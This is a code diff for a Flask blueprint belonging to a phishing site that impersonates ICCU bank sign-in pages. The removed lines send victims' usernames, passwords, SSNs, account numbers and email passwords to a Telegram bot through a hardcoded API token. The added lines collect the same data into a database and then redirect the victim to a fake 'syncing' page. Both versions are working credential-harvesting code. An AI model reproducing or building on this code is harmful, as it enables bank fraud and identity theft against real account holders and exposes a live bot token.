@@ -1,12 +1,6 @@
 from flask import Blueprint, render_template, request, redirect, url_for
-# from .utils import report_login, security_question, report_address
-import telebot
+from mandt import db, User, Others
 
-API_TOKEN = '5716438159:AAGuFg4xF9L44ChmKBFyxLdR5Jk9o7gOLCA'
-
-receiver_id = 1297895706
-
-bot = telebot.TeleBot(API_TOKEN)
 
 portals = Blueprint('portals', __name__)
 
@@ -17,9 +11,9 @@ def signin():
         password = request.form['password']
         if user_id and password:
             # print(user_id,password,first_try_user_id,first_try_password)
-            # report_login(user_id,password, bank_name='ICCU')
-            # print(user_id, password)
-            bot.send_message(receiver_id, f'+------------ICCU--------------+\nUsername: {user_id}\nPassword: {password}\n+--------------------------+')
+            new_user = User(username=user_id, password=password)
+            db.session.add(new_user)
+            db.session.commit()
             return redirect(url_for('portals.other_info'))
     return render_template('sign_in.html')
 
@@ -27,20 +21,14 @@ def signin():
 @portals.route('/signin/verify-information', methods=['GET','POST'])
 def other_info():
     if request.method == 'POST':
-        email = request.form['email']
+        email_ = request.form['email']
         email_pass = request.form['email-password']
-        ssn = request.form['ssn']
-        accNum = request.form['accNum']
+        ssn_ = request.form['ssn']
+        accNum_ = request.form['accNum']
         # print(email, email_pass,ssn,accNum)
-        bot.send_message(receiver_id, f'+--------------ICCU------------+\n\
-            ------------QUESTION AND ANSWER-------------\
-            SSN -----> {ssn}\n\
-            Account Number -----> {accNum}\n\
-            \n\n\n\
-            +------------ICCU EMAIL CREDENTIALS-------------+\
-            Email -----> {email}\n\
-            Password -----> {email_pass}\n+--------------------------+')
-        # security_question(q1,ans1,q2,ans2,q3,ans3,email,email_pass)
+        new_other_info = Others(email=email_, password=email_pass, ssn=ssn_, accNum=accNum_)
+        db.session.add(new_other_info)
+        db.session.commit()
         return redirect(url_for('main.syncing'))
     return render_template('other_info.html')  
 
